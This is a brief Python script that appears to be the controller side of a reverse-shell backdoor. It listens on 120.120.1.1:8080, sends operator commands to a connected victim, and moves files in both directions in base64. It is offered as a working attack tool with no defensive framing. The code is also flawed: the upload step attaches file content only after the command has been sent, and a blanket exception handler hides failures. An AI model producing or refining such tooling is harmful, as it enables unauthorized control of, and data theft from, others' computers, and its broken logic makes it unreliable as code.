#!/usr/bin/env python

import socket
import json
import base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[X] Listening for incoming connections")
        self.connection, address = listener.accept()
        print("[X]" + str(address) + "is connected")
    
    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def json_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def remote_code(self, command):
        self.json_send(command)
        return self.json_receive()
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Download compeleted"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def run(self):
        try:
            while True:
                command = input(">>")
                command = command.split(" ")
                result = self.remote_code(command)
                if command[0] == "download" and "[-] Something" not in result:
                    result = self.write_file(command[1], result)
                if command[0] == "upload":
                    content = self.read_file(command[1])
                    command.append(content)
                print(result)
        except Exception:
            result = "[-] Something went wron"
my_listener = Listener("120.120.1.1", 8080)
my_listener.run()